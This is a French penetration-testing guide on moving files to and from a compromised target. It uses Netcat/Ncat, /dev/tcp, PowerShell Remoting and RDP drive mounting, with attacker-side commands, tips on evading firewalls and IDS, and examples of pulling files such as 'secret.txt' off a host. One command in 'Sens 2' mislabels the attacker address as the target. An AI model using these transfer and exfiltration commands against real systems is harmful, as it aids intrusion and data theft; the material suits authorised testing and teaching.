# Methodes alternatives de transfert

## Pourquoi

Les methodes classiques (HTTP, SMB, FTP) ne passent pas toujours. Certains environnements filtrent agressivement le trafic sortant ou ne disposent pas des outils habituels. Dans ces cas, des alternatives comme Netcat, PowerShell Remoting ou le montage de dossiers via RDP peuvent sauver la situation.

## Comment ca marche

### Netcat et Ncat

Netcat (`nc`) est un utilitaire reseau minimaliste qui permet d'etablir des connexions TCP ou UDP brutes. Il peut servir de canal de transfert basique : un cote ecoute et recoit les donnees, l'autre envoie. Ncat (projet Nmap) est une version modernisee qui supporte SSL, IPv6 et les proxys SOCKS/HTTP.

### PowerShell Remoting (WinRM)

WinRM (ports 5985/HTTP et 5986/HTTPS) permet d'executer des commandes a distance via PowerShell. La cmdlet `Copy-Item` supporte les transferts de fichiers entre sessions PowerShell distantes. C'est une methode propre a l'ecosysteme Windows, souvent disponible dans les domaines Active Directory.

### RDP (Remote Desktop Protocol)

Lors d'une session RDP, le montage d'un repertoire local rend les fichiers accessibles directement sur la machine distante. C'est un transfert transparent, sans outil supplementaire.

## En pratique

### Transfert avec Netcat/Ncat

**Sens 1 : la cible ecoute, l'attaquant envoie**

Sur la cible :

{% tabs %}
{% tab title="Netcat" %}
```bash
nc -l -p 8000 > fichier.exe
```
{% endtab %}
{% tab title="Ncat" %}
```bash
ncat -l -p 8000 --recv-only > fichier.exe
```
{% endtab %}
{% endtabs %}

Sur l'attaquant :

{% tabs %}
{% tab title="Netcat" %}
```bash
nc -q 0 <IP_CIBLE> 8000 < fichier.exe
```
{% endtab %}
{% tab title="Ncat" %}
```bash
ncat --send-only <IP_CIBLE> 8000 < fichier.exe
```
{% endtab %}
{% endtabs %}

**Sens 2 : l'attaquant ecoute, la cible se connecte**

Sur l'attaquant :

```bash
sudo nc -l -p 443 -q 0 < fichier.exe
```

Sur la cible :

```bash
nc <IP_CIBLE> 443 > fichier.exe
```

{% hint style="info" %}
Utiliser le port 443 permet souvent de passer les pare-feux, qui autorisent generalement le trafic HTTPS en sortie.
{% endhint %}

**Alternative sans netcat : /dev/tcp**

Si ni `nc` ni `ncat` ne sont disponibles sur la cible :

```bash
cat < /dev/tcp/<IP_CIBLE>/443 > fichier.exe
```

### Transfert via PowerShell Remoting

**Verifier la connectivite WinRM :**

```powershell
Test-NetConnection -ComputerName <IP_CIBLE> -Port 5985
```

**Creer une session distante et transferer un fichier :**

```powershell
$session = New-PSSession -ComputerName <IP_CIBLE>

# - Upload vers la cible
Copy-Item -Path C:\outils\outil.exe -ToSession $session -Destination C:\Users\Admin\Desktop\

# - Download depuis la cible
Copy-Item -Path "C:\Users\Admin\Desktop\secret.txt" -FromSession $session -Destination C:\
```

{% hint style="warning" %}
PowerShell Remoting necessite des privileges suffisants sur la machine distante (generalement administrateur local ou membre du groupe Remote Management Users).
{% endhint %}

### Transfert via RDP

Le montage de repertoires locaux lors d'une connexion RDP permet un transfert de fichiers sans outil supplementaire.

{% tabs %}
{% tab title="xfreerdp" %}
```bash
xfreerdp /v:<IP_CIBLE> /u:utilisateur /p:'motdepasse' /drive:partage,/home/user/fichiers
```
{% endtab %}
{% tab title="rdesktop" %}
```bash
rdesktop <IP_CIBLE> -u utilisateur -p 'motdepasse' -r disk:partage=/home/user/fichiers
```
{% endtab %}
{% endtabs %}

Une fois connecte, le repertoire partage apparait dans l'explorateur de fichiers sous "Ce PC" comme un lecteur reseau. Il suffit de copier-coller les fichiers.

Sur Windows (mstsc.exe), activer le montage de lecteur local dans les options de connexion, onglet "Ressources locales".

## Pieges et galeres

- Netcat ne chiffre pas les transferts. Tout passe en clair, ce qui peut declencher un IDS. Ncat avec l'option `--ssl` resout ce probleme.
- PowerShell Remoting peut etre desactive ou bloque par GPO dans certains environnements. Verifier avec `Get-Service WinRM`.
- Le montage RDP ne fonctionne pas si la politique de groupe bloque la redirection de lecteurs. C'est courant dans les environnements securises.
- Netcat n'est pas installe par defaut sur toutes les distributions. Sur les systemes minimalistes, il peut etre absent.

## Retour terrain

Netcat est un couteau suisse indispensable. En mission, on l'utilise souvent pour des transferts rapides quand on a deja un shell sur la cible. Le montage RDP est la methode la plus naturelle quand on a deja une session bureau a distance. WinRM est precieux dans les environnements Active Directory ou on rebondit de machine en machine.

## Memo express

| Methode | Commande rapide |
|---|---|
| Netcat (ecoute) | `nc -l -p PORT > fichier` |
| Netcat (envoi) | `nc -q 0 IP PORT < fichier` |
| /dev/tcp | `cat < /dev/tcp/IP/PORT > fichier` |
| WinRM (upload) | `Copy-Item -Path fichier -ToSession $s -Destination chemin` |
| WinRM (download) | `Copy-Item -Path chemin -FromSession $s -Destination local` |
| RDP (xfreerdp) | `xfreerdp /v:IP /drive:nom,/chemin/local` |

***
